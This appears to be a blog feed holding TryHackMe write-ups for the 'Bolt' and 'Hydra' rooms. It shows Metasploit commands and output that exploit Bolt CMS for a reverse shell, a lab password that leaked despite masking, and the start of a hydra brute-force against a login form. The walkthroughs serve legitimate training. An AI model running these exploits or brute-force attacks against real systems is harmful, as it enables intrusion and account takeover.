SF:0&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>viewport<span style="color:#ae81ff">\&#34;\x</span>20content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>width<span style="color:#f92672">=</span>device-width,<span style="color:#ae81ff">\x</span>20initial
SF:-scale<span style="color:#f92672">=</span>1<span style="color:#ae81ff">\.</span>0<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;title&gt;Bolt<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\|\x</span>20A<span style="color:#ae81ff">\x</span>20hero<span style="color:#ae81ff">\x</span>20is<span style="color:#ae81ff">\x</span>20unleashed&lt;/title&gt;<span style="color:#ae81ff">\n\x</span><span style="color:#ae81ff">2</span>
SF:0<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>https://fonts<span style="color:#ae81ff">\.</span>googleapis<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>SF:.com/css<span style="color:#ae81ff">\?</span>family<span style="color:#f92672">=</span>Bitter<span style="color:#ae81ff">\|</span>Roboto:400,400i,700<span style="color:#ae81ff">\&#34;\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n</span>
SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/
SF:theme/base-2018/css/bulma<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>8ca0842ebb<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;link<span style="color:#ae81ff">\x</span>20rel<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>stylesheet<span style="color:#ae81ff">\&#34;\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>/theme/base-2018/css/them
SF:e<span style="color:#ae81ff">\.</span>css<span style="color:#ae81ff">\?</span>6cb66bfe9f<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\t</span>&lt;meta<span style="color:#ae81ff">\x</span>20name<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>generator<span style="color:#ae81ff">\&#34;\x</span><span style="color:#ae81ff">2</span>
SF:0content<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>Bolt<span style="color:#ae81ff">\&#34;</span>&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;/head&gt;<span style="color:#ae81ff">\n\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;body&gt;<span style="color:#ae81ff">\n\x</span>
SF:20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>20&lt;a<span style="color:#ae81ff">\x</span>20href<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#75715e">#main-content\&#34;\x20class=\&#34;v</span>
SF:is<span style="color:#e6db74">&#34;);
</span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 65.93 seconds
</span></code></pre></div><h2 id="task-2-what-is-the-username-we-can-find-in-the-cms">[Task 2] What is the username we can find in the CMS?</h2>
<p>Without much digging I&rsquo;m gonna guess it is <strong>bolt</strong> based on the overall theme of the room and indeed it is accepted as valid. This is weird because the post we can see in the page mentions the user is <strong>jake</strong> and he also posts his password <strong>REDACTED</strong> could this be a bug on the room? (Spoiler: It is not. XD )</p>
<h2 id="task-3-what-is-the-password-we-can-find-for-the-username">[Task 3] What is the password we can find for the username?</h2>
<p><img src="https://i.imgur.com/Swa5OGj.png" alt="Post from Admin with a Password"></p>
<p>We already got a password in the previous task.</p>
<h2 id="task-4-what-version-of-the-cms-is-installed-on-the-server-ex-name-111">[Task 4] What version of the CMS is installed on the server? (Ex: Name 1.1.1)</h2>
<p>Since we have a username and password, we could try to google a bit common login page URL locations for Bolt CMS.
When we try to access, we do get a login form.</p>
<p><img src="https://i.imgur.com/3Q8d31i.png" alt="Bolt Login form"></p>
<p>Once we are logged in we can see the installed version in the footer toolbar and with that we get the answer to the CMS version:</p>
<p><img src="https://i.imgur.com/3Wv2bhG.png" alt="Bolt version installed"></p>
<p>Let&rsquo;s move to the next question.</p>
<h2 id="task-5-theres-an-exploit-for-a-previous-version-of-this-cms-which-allows-authenticated-rce-find-it-on-exploit-db-whats-its-edb-id">[Task 5] There&rsquo;s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What&rsquo;s its EDB-ID?</h2>
<p>Using <strong>Exploit-DB</strong> we can look for RCE vulnerabilities for <strong>older</strong> versions of Bolt CMS.</p>
<p><img src="https://i.imgur.com/DXLDHC9.png" alt="Exploit-DB"></p>
<p>Let&rsquo;s move on.</p>
<h2 id="task-6-metasploit-recently-added-an-exploit-module-for-this-vulnerability-whats-the-full-path-for-this-exploit-ex-exploit">[Task 6] Metasploit recently added an exploit module for this vulnerability. What&rsquo;s the full path for this exploit? (Ex: exploit/&hellip;.)</h2>
<p>We fire up <strong>msfconsole</strong> and do a <strong>search bolt cms</strong> to see the available exploits:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 &gt; search bolt cms

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#   Name                                              Disclosure Date  Rank       Check  Description</span>
   -   ----                                              ---------------  ----       -----  -----------
   <span style="color:#ae81ff">0</span>   auxiliary/admin/sunrpc/solaris_kcms_readfile      2003-01-22       normal     No     Solaris KCMS + TTDB Arbitrary File Read
   <span style="color:#ae81ff">1</span>   auxiliary/gather/ipcamera_password_disclosure     2016-08-16       normal     No     JVC/Siemens/Vanderbilt IP-Camera Readfile Password Disclosure
   <span style="color:#ae81ff">2</span>   auxiliary/gather/nuuo_cms_bruteforce              2018-10-11       normal     No     Nuuo Central Management Server User Session Token Bruteforce
   <span style="color:#ae81ff">3</span>   auxiliary/gather/nuuo_cms_file_download           2018-10-11       normal     No     Nuuo Central Management Server Authenticated Arbitrary File Download
   <span style="color:#ae81ff">4</span>   auxiliary/scanner/http/ektron_cms400net                            normal     No     Ektron CMS400.NET Default Password Scanner
   <span style="color:#ae81ff">5</span>   auxiliary/scanner/http/s40_traversal              2011-04-07       normal     No     S40 0.4.2 CMS Directory Traversal Vulnerability
   <span style="color:#ae81ff">6</span>   auxiliary/scanner/http/squiz_matrix_user_enum     2011-11-08       normal     No     Squiz Matrix User Enumeration Scanner
   <span style="color:#ae81ff">7</span>   auxiliary/scanner/http/vcms_login                                  normal     No     V-CMS Login Utility
   <span style="color:#ae81ff">8</span>   auxiliary/scanner/misc/cctv_dvr_login                              normal     No     CCTV DVR Login Scanning Utility
   <span style="color:#ae81ff">9</span>   exploit/aix/rpc_cmsd_opcode21                     2009-10-07       great      No     AIX Calendar Manager Service Daemon <span style="color:#f92672">(</span>rpc.cmsd<span style="color:#f92672">)</span> Opcode <span style="color:#ae81ff">21</span> Buffer Overflow
   <span style="color:#ae81ff">10</span>  exploit/linux/http/cayin_cms_ntp                  2020-06-04       excellent  Yes    Cayin CMS NTP Server RCE
   <span style="color:#ae81ff">11</span>  exploit/linux/http/tiki_calendar_exec             2016-06-06       excellent  Yes    Tiki-Wiki CMS Calendar Command Execution
   <span style="color:#ae81ff">12</span>  exploit/linux/http/vcms_upload                    2011-11-27       excellent  Yes    V-CMS PHP File Upload and Execute
   <span style="color:#ae81ff">13</span>  exploit/multi/http/bolt_file_upload               2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
   <span style="color:#ae81ff">14</span>  exploit/multi/http/cmsms_object_injection_rce     2019-03-26       normal     Yes    CMS Made Simple Authenticated RCE via object injection
   <span style="color:#ae81ff">15</span>  exploit/multi/http/cmsms_showtime2_rce            2019-03-11       normal     Yes    CMS Made Simple <span style="color:#f92672">(</span>CMSMS<span style="color:#f92672">)</span> Showtime2 File Upload RCE
   <span style="color:#ae81ff">16</span>  exploit/multi/http/cmsms_upload_rename_rce        2018-07-03       excellent  Yes    CMS Made Simple Authenticated RCE via File Upload/Copy
   <span style="color:#ae81ff">17</span>  exploit/multi/http/familycms_less_exec            2011-11-29       excellent  Yes    Family Connections less.php Remote Command Execution
   <span style="color:#ae81ff">18</span>  exploit/multi/http/getsimplecms_unauth_code_exec  2019-04-28       excellent  Yes    GetSimpleCMS Unauthenticated RCE
   <span style="color:#ae81ff">19</span>  exploit/multi/http/lcms_php_exec                  2011-03-03       excellent  Yes    LotusCMS 3.0 eval<span style="color:#f92672">()</span> Remote Command Execution
   <span style="color:#ae81ff">20</span>  exploit/multi/http/log1cms_ajax_create_folder     2011-04-11       excellent  Yes    Log1 CMS writeInfo<span style="color:#f92672">()</span> PHP Code Injection
   <span style="color:#ae81ff">21</span>  exploit/multi/http/monstra_fileupload_exec        2017-12-18       excellent  Yes    Monstra CMS Authenticated Arbitrary File Upload
   <span style="color:#ae81ff">22</span>  exploit/multi/http/navigate_cms_rce               2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution
   <span style="color:#ae81ff">23</span>  exploit/multi/http/october_upload_bypass_exec     2017-04-25       excellent  Yes    October CMS Upload Protection Bypass Code Execution
   <span style="color:#ae81ff">24</span>  exploit/multi/http/polarcms_upload_exec           2012-01-21       excellent  Yes    PolarBear CMS PHP File Upload Vulnerability
   <span style="color:#ae81ff">25</span>  exploit/multi/http/sflog_upload_exec              2012-07-06       excellent  Yes    Sflog! CMS 1.0 Arbitrary File Upload Vulnerability
   <span style="color:#ae81ff">26</span>  exploit/multi/http/totaljs_cms_widget_exec        2019-08-30       excellent  Yes    Total.js CMS <span style="color:#ae81ff">12</span> Widget JavaScript Code Injection
   <span style="color:#ae81ff">27</span>  exploit/multi/php/php_unserialize_zval_cookie     2007-03-04       average    Yes    PHP <span style="color:#ae81ff">4</span> unserialize<span style="color:#f92672">()</span> ZVAL Reference Counter Overflow <span style="color:#f92672">(</span>Cookie<span style="color:#f92672">)</span>
   <span style="color:#ae81ff">28</span>  exploit/unix/webapp/bolt_authenticated_rce        2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
   <span style="color:#ae81ff">29</span>  exploit/unix/webapp/get_simple_cms_upload_exec    2014-01-04       excellent  Yes    GetSimpleCMS PHP File Upload Vulnerability
   <span style="color:#ae81ff">30</span>  exploit/unix/webapp/havalite_upload_exec          2013-06-17       excellent  Yes    Havalite CMS Arbitary File Upload Vulnerability
   <span style="color:#ae81ff">31</span>  exploit/unix/webapp/instantcms_exec               2013-06-26       excellent  Yes    InstantCMS 1.6 Remote PHP Code Execution
   <span style="color:#ae81ff">32</span>  exploit/unix/webapp/joomla_akeeba_unserialize     2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
   <span style="color:#ae81ff">33</span>  exploit/unix/webapp/joomla_media_upload_exec      2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
   <span style="color:#ae81ff">34</span>  exploit/unix/webapp/libretto_upload_exec          2013-06-14       excellent  Yes    LibrettoCMS File Manager Arbitary File Upload Vulnerability
   <span style="color:#ae81ff">35</span>  exploit/unix/webapp/skybluecanvas_exec            2014-01-28       excellent  Yes    SkyBlueCanvas CMS Remote Code Execution
   <span style="color:#ae81ff">36</span>  exploit/windows/browser/ie_execcommand_uaf        2012-09-14       good       No     MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability
   <span style="color:#ae81ff">37</span>  exploit/windows/http/ektron_xslt_exec             2012-10-16       excellent  Yes    Ektron 8.02 XSLT Transform Remote Code Execution
   <span style="color:#ae81ff">38</span>  exploit/windows/http/ektron_xslt_exec_ws          2015-02-05       excellent  Yes    Ektron 8.5, 8.7, 9.0 XSLT Transform Remote Code Execution
   <span style="color:#ae81ff">39</span>  exploit/windows/http/kentico_staging_syncserver   2019-04-15       excellent  Yes    Kentico CMS Staging SyncServer Unserialize Remote Command Execution
   <span style="color:#ae81ff">40</span>  exploit/windows/http/umbraco_upload_aspx          2012-06-28       excellent  No     Umbraco CMS Remote Command Execution
   <span style="color:#ae81ff">41</span>  exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass <span style="color:#f92672">(</span>Via COM Handler Hijack<span style="color:#f92672">)</span>
   <span style="color:#ae81ff">42</span>  exploit/windows/nuuo/nuuo_cms_fu                  2018-10-11       manual     No     Nuuo Central Management Server Authenticated Arbitrary File Upload
   <span style="color:#ae81ff">43</span>  exploit/windows/nuuo/nuuo_cms_sqli                2018-10-11       normal     No     Nuuo Central Management Authenticated SQL Server SQLi
   <span style="color:#ae81ff">44</span>  exploit/windows/smtp/njstar_smtp_bof              2011-10-31       normal     Yes    NJStar Communicator 3.00 MiniSMTP Buffer Overflow


Interact with a module by name or index, <span style="color:#66d9ef">for</span> example use <span style="color:#ae81ff">44</span> or use exploit/windows/smtp/njstar_smtp_bof

msf5 &gt; 
</code></pre></div><p>by looking at the results returned and having found the vulnerability on <strong>Exploit-DB</strong> we get the answer to the room question.
Let&rsquo;s try to exploit that in the next step.</p>
<h2 id="task-7-set-the-lhost-lport-rhost-username-password-in-msfconsole-before-running-the-exploit">[Task 7] Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit</h2>
<p>Let&rsquo;s configure the options for our exploit, by doing <strong>show options</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using configured payload cmd/unix/reverse_netcat
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; show options

Module options <span style="color:#f92672">(</span>exploit/unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span>:

   Name                 Current Setting        Required  Description
   ----                 ---------------        --------  -----------
   FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path from <span style="color:#e6db74">&#34;/files&#34;</span> on the web server to <span style="color:#e6db74">&#34;/root&#34;</span> on the server
   PASSWORD                                    yes       Password to authenticate with
   Proxies                                     no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
   RHOSTS                                      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, range CIDR identifier, or hosts file with syntax <span style="color:#e6db74">&#39;file:&lt;path&gt;&#39;</span>
   RPORT                8***                   yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
   SRVHOST              0.0.0.0                yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT              <span style="color:#ae81ff">8080</span>                   yes       The local port to listen on.
   SSL                  false                  no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
   SSLCert                                     no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
   TARGETURI            /                      yes       Base path to Bolt CMS
   URIPATH                                     no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
   USERNAME                                    yes       Username to authenticate with
   VHOST                                       no        HTTP server virtual host


Payload options <span style="color:#f92672">(</span>cmd/unix/reverse_netcat<span style="color:#f92672">)</span>:

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   <span style="color:#ae81ff">2</span>   Linux <span style="color:#f92672">(</span>cmd<span style="color:#f92672">)</span>
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set LHOST tun0
LHOST <span style="color:#f92672">=</span>&gt; 10.13.0.34
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set RHOSTS 10.10.105.96
RHOSTS <span style="color:#f92672">=</span>&gt; 10.10.105.96
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set USERNAME bolt
USERNAME <span style="color:#f92672">=</span>&gt; bolt
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; set PASSWORD REDACTED
PASSWORD <span style="color:#f92672">=</span>&gt; boltadmin123
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; 

</code></pre></div><p>Let&rsquo;s run the exploit so we can answer the last question:</p>
<h2 id="task-8-look-for-flagtxt-inside-the-machine">[Task 8] Look for flag.txt inside the machine.</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">msf5 exploit<span style="color:#f92672">(</span>unix/webapp/bolt_authenticated_rce<span style="color:#f92672">)</span> &gt; run

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.13.0.34:4444 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Executing automatic check <span style="color:#f92672">(</span>disable AutoCheck to override<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable <span style="color:#e6db74">&#34;hxzhm&#34;</span>.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found <span style="color:#ae81ff">4</span> potential token<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> creating .php files.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file evhhumxnxs.php.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file jfdcqabl.php.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file hgpputegi.php.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Used token dc684ac30691d198a52d1110d6 to create helqvqylpa.php.
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to execute the payload via <span style="color:#e6db74">&#34;/files/helqvqylpa.php?hxzhm=`payload`&#34;</span>
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">7</span> opened <span style="color:#f92672">(</span>10.13.0.34:4444 -&gt; 10.10.105.96:44727<span style="color:#f92672">)</span> at 2020-08-26 21:26:37 -0400
<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> No response, may have executed a blocking payload!
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Deleted file helqvqylpa.php.
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Reverted user profile back to original state.

ls
index.html
shell  
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to find binary<span style="color:#f92672">(</span>python<span style="color:#f92672">)</span> on target machine
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found python at 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using <span style="color:#e6db74">`</span>python<span style="color:#e6db74">`</span> to pop up an interactive shell
pwd
/home/bolt/public/files
cat /home/bolt/flag.txt
cat /home/flag.txt
THM<span style="color:#f92672">{</span>FLAG_REDACTED_YOU_GOT_THIS!<span style="color:#f92672">}</span>

</code></pre></div><p>The shell we got is quite basic and in my case we it hanged a lot of times. I was unable to upgrade that shell to meterpreter, but to be honest I tried it just once and moved on. I tried a bit of exploring probing some paths with <strong>cat</strong> looking for <strong>flag.txt</strong> and found it rather quickly.</p>
<p>That&rsquo;s it for Bolt room. Hope you enjoyed it!</p>
<p>As usual, happy hacking.</p>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<div class="container" style="margin:10px !important">
    <div class="center">
        <script src="https://tryhackme.com/badge/71634"></script>
    </div>
    <div class="center">
        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
        <br> 
</div>
]]></content>
        </item>
        
        <item>
            <title>Hydra_writeup.sh</title>
            <link>https://tzero86-bits.netlify.app/posts/hydra_writeup/</link>
            <pubDate>Wed, 26 Aug 2020 14:43:42 -0400</pubDate>
            
            <guid>https://tzero86-bits.netlify.app/posts/hydra_writeup/</guid>
            <description>Hydra - THM Room This is a quick writeup or another &amp;ldquo;just-me-taking-notes&amp;rdquo; thing for Hydra TryhackMe&amp;rsquo;s room. This is a pretty raw and quick writeup detailing my process to pawn this room.
Enjoy!
 Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</description>
            <content type="html"><![CDATA[<h1 id="hydra---thm-room">Hydra - THM Room</h1>
<p>This is a quick writeup or another &ldquo;just-me-taking-notes&rdquo; thing for Hydra TryhackMe&rsquo;s room. This is a pretty raw and quick writeup detailing my process to pawn this room.</p>
<p>Enjoy!</p>
<ul>
<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/hydra">clicking this link</a>.</li>
<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
<li>Donwload Hydra by clicking <a href="https://github.com/vanhauser-thc/thc-hydra">this</a> link.</li>
</ul>
<h2 id="task-1-deploy-and-compromise-the-vulnerable-machine">[Task 1] Deploy and compromise the vulnerable machine!</h2>
<p>Ok we deploy the machine, we open the IP on the browser. We arrive to a login form:</p>
<p><img src="https://i.imgur.com/hhYFnkP.png" alt="Login Form"></p>
<p>We need to intercept a login request, capture the error message and feed all that information to <strong>hydra</strong> to bruteforce our way in. In my case I used burp to capture the request and copied the login error message from the web itself:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">POST /login HTTP/1.1
Host: 10.10.207.42
Content-Length: <span style="color:#ae81ff">27</span>
Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
Origin: http://10.10.207.42
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/84.0.4147.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
Referer: http://10.10.207.42/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
Cookie: connect.sid<span style="color:#f92672">=</span>§s%3AuTOeTMubK4HkZh5O_fBmQyEs82mjMPad.kq4lhxSPBxkOXNiadO8R7w1mqmISpwvQv7Il8KJ1Hzg§
Connection: close

username<span style="color:#f92672">=</span>§test§&amp;password<span style="color:#f92672">=</span>§test§
errorMessage: Your username or password is incorrect.
</code></pre></div><p>We need to construct a <strong>POST</strong> request attack with <strong>hydra</strong>. Lucky us, the room is quite good at providing an example as well as the target Username <strong>molly</strong>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">hydra -l &lt;username&gt; -P &lt;wordlist&gt; 10.10.207.42 http-post-form <span style="color:#e6db74">&#34;/:username=^USER^&amp;password=^PASS^:F=incorrect&#34;</span> -V
</code></pre></div><ul>
<li><!-- raw HTML omitted -->: molly</li>
<li><!-- raw HTML omitted -->: we&rsquo;ll use rockyou.txt</li>
<li><!-- raw HTML omitted -->: /login</li>
</ul>
<p>Using the details from the request and the room we fire up our hydra attack:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/hydra<span style="color:#f92672">]</span>
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.207.42 http-post-form <span style="color:#e6db74">&#34;/login:username=^USER^&amp;password=^PASS^:F=Your username or password is incorrect&#34;</span> -V
Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.

Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-26 14:30:29
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">14344399</span> login tries <span style="color:#f92672">(</span>l:1/p:14344399<span style="color:#f92672">)</span>, ~896525 tries per task
<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.207.42:80/login:username<span style="color:#f92672">=</span>^USER^&amp;password<span style="color:#f92672">=</span>^PASS^:F<span style="color:#f92672">=</span>Your username or password is incorrect
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;123456&#34;</span> - <span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 0<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
<span style="color:#f92672">[</span>ATTEMPT<span style="color:#f92672">]</span> target 10.10.207.42 - login <span style="color:#e6db74">&#34;molly&#34;</span> - pass <span style="color:#e6db74">&#34;12345&#34;</span> - <span style="color:#ae81ff">2</span> of <span style="color:#ae81ff">14344399</span> <span style="color:#f92672">[</span>child 1<span style="color:#f92672">]</span> <span style="color:#f92672">(</span>0/0<span style="color:#f92672">)</span>
